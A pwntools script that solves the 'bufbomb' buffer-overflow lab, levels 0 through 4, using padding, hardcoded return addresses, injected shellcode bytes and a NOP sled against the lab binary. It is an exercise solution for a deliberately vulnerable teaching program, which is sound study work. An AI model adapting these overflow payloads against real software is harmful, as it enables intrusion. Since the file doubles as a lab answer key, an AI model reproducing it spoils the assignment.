#! /usr/bin/python3
from pwn import *
import sys

def debug(argc=''):
    gdb.attach(io,argc)
    pause()

context.log_level = 'debug'
context.arch = 'i386'

cookie = 0x525bbdb4

if sys.argv[1] == 'level4':
    io = process(argv=['./bufbomb','-u samrito','-n'])
else:
    io = process(argv=['./bufbomb', '-u samrito'])

if sys.argv[1] == 'level0':
    smoke_addr = 0x08048c18
    payload = flat([b'\x00'*(0x28+4), smoke_addr])
    io.recvline()
    io.recvline()
    io.sendline(payload)
    io.interactive()

elif sys.argv[1] == 'level1':
    fizz_addr = 0x08048c42
    payload = flat([b'\x00'*(0x28+4), fizz_addr, 0xdeadbeef, cookie])
    io.recvline()
    io.recvline()
    debug('b * getbuf')
    io.sendline(payload)
    io.interactive()
elif sys.argv[1] == 'level2':
    bang_addr = 0x08048c9d
    #shell code: c7 05 00 d1 04 08 b4 bd 5b 52 c3
    eax_addr = 0x55682fc8
    payload = flat([b'\xc7\x05\x00\xd1\x04\x08\xb4\xbd\x5b\x52\xc3'.ljust(0x28+4,b'\x00'),eax_addr,bang_addr,0xdeadbeef, 0])
    io.recvline()
    io.recvline()
    debug('b * getbuf')
    io.sendline(payload)
    io.interactive()
elif sys.argv[1] == 'level3':
    #shellcode: b8 b4 bd 5b 52 bd 20 30 68 55 c3
    ret_addr = 0x08048dbe
    eax_addr = 0x55682fc8
    ret_ebp = 0x55683020
    # payload = flat([b'\xb8\xb4\xbd\x5b\x52\xbd\x20\x30\x68\x55\xc3'.ljust(0x28+4, b'\x00'), eax_addr,ret_addr])
    payload = flat([b'\xb8\xb4\xbd\x5b\x52\xbd\x20\x30\x68\x55\x68\xbe\x8d\x04\x08\xc3'.ljust(0x28+4, b'\x00'), eax_addr])
    io.recvline()
    io.recvline()
    #debug('b * getbuf')
    io.sendline(payload)
    io.interactive()
elif sys.argv[1] == 'level4':
    #shellcode: 8d 6c 24 28 b8 b4 bd 5b 52 68 3a 8e 04 08 c3
    # debug('b * getbufn')
    for i in range(5):
        ret_addr = 0x55682ff0 - 200
        payload = flat([b'\x90'*(0x208+4-15),b'\x8d\x6c\x24\x28\xb8\xb4\xbd\x5b\x52\x68\x3a\x8e\x04\x08\xc3', ret_addr])
        print('90 '*(0x208+4-15))
        io.recvline()
        io.recvline()
        io.sendline(payload)
    io.interactive()

